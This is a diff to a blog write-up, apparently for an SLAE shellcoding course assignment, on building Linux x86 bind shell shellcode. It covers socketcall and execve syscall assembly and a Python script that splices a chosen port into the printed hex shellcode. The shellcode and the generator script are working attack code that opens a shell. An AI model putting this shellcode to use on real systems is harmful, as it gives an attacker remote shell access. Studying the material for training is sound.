@@ -102,7 +102,7 @@ Now that's covered, let's dive in.
 
 We can look at system calls on our Ubuntu x86 machine at `/usr/include/i386-linux-gnu/asm/unistd_32.h`
 
-The system call for the C equivalent of socket() is socketcall.
+To call the C equivalent of socket() we'll have to use socketcall with the SYS_SOCKET argument.
 
 ```
 absolomb@ubuntu:~/SLAE/assignments/1$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep socket
@@ -393,7 +393,7 @@ b'68732f2f'
 >>> binascii.hexlify(b'nib/')
 b'6e69622f'
 ```
-First we push a null to the stack, then push our /bin//sh hex. The point ebx to the stack, null out the ECX register, move the execve syscall into EAX, and finally execute. 
+First we push a null to the stack to null terminate our /bin//sh argument, then push our /bin//sh hex. The point ebx to the stack, null out the ECX register, move the execve syscall into EAX, and finally execute. 
 
 ```nasm
 push edx
@@ -574,13 +574,17 @@ To make the port configurable I made a simple Python script (which isn't the pre
 #!/usr/bin/env python3
 import sys
 import struct
+import argparse
 
+parser = argparse.ArgumentParser()
+parser.add_argument('-p', "--port")
+args = parser.parse_args()
 
-if len(sys.argv) < 2:
-    print("port needed")
+if args.port == None:
+    parser.print_help()
     exit()
 
-port = int(sys.argv[1])
+port = int(args.port)
 
 if port > 65535:
     print("Please enter a valid port number!")
@@ -588,12 +592,14 @@ if port > 65535:
 
 if port < 1024:
     print("You'll need to be root to use this port!")
-    exit()
 
 port = struct.pack("!H", port)
-port = str(port).lstrip("b'")
-port = port.rstrip("'")
 
+port = ("{}".format(''.join('\\x{:02x}'.format(b) for b in port)))
+
+if "\\x00" in port:
+    print(" Nulls in selected port!")
+    exit()
 
 shellcode = """
 \\x31\\xc0\\x31\\xdb\\x31\\xc9\\xb0\\x66\\xb3\\x01\\x51\\x53\\x6a\\x02
@@ -605,8 +611,9 @@ shellcode = """
 \\x62\\x69\\x6e\\x89\\xe3\\x89\\xd1\\xb0\\x0b\\xcd\\x80
 """ % (port)
 
-print ("Shellcode:")
+print("Shellcode:")
 print(shellcode.replace("\n", ""))
+
 ```
 
 Now to test, this time with a different port.
